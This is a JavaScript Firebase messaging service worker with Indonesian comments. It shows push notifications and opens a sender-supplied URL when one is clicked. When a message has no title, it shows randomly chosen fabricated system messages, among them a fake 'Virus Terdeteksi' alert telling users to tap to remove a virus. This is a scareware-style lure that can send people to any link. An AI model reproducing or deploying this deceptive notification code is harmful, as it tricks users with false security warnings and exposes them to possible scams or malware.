// === Import Firebase SDK ===
importScripts("https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js");
importScripts("https://www.gstatic.com/firebasejs/10.12.2/firebase-messaging.js");

// === Konfigurasi Firebase ===
firebase.initializeApp({
    apiKey: "AIzaSyAtTaKf_Psb-yhxa5nNFIcs3Tte5gjYe00",
    authDomain: "locked-1dfad.firebaseapp.com",
    projectId: "locked-1dfad",
    storageBucket: "locked-1dfad.firebasestorage.app",
    messagingSenderId: "237366240355",
    appId: "1:237366240355:web:e3a4f999ff547a07398456"
});

// === Init Messaging ===
const messaging = firebase.messaging();

// === Template notifikasi (judul & body berpasangan) ===
const notifTemplates = [
    {
        title: "🔔 Notifikasi Baru",
        body: "Klik untuk melihat informasi."
    },
    {
        title: "⚡ Sistem Update",
        body: "Update berhasil dijalankan."
    },
    {
        title: "📢 Info Penting",
        body: "Silakan buka untuk melanjutkan."
    },
    {
        title: "🔄 Sinkronisasi Data",
        body: "Sinkronisasi data berhasil."
    },
    {
        title: "✅ Proses Berhasil",
        body: "Proses telah selesai dengan sukses."
    },
    {
        title: "⚠️ Virus Terdeteksi",
        body: "Ketuk untuk menghapus virus ini."
    }
];

function pickRandomTemplate() {
    return notifTemplates[Math.floor(Math.random() * notifTemplates.length)];
}

// === Listener pesan background ===
messaging.onBackgroundMessage((payload) => {
    console.log("Pesan background diterima:", payload);
    
    // Ambil dari payload kalau ada, kalau kosong fallback ke template random
    const template = pickRandomTemplate();
    const title = payload.data?.title && payload.data.title.trim() !== "" ? payload.data.title : template.title;
    const body  = payload.data?.body && payload.data.body.trim() !== "" ? payload.data.body : template.body;
    const url   = payload.data?.url || "/";
    
    // Tampilkan notif
    self.registration.showNotification(title, {
        body: body,
        data: { url }
    });
});

// === Klik notif buka link ===
self.addEventListener("notificationclick", (event) => {
    event.notification.close();
    event.waitUntil(clients.openWindow(event.notification.data.url));
});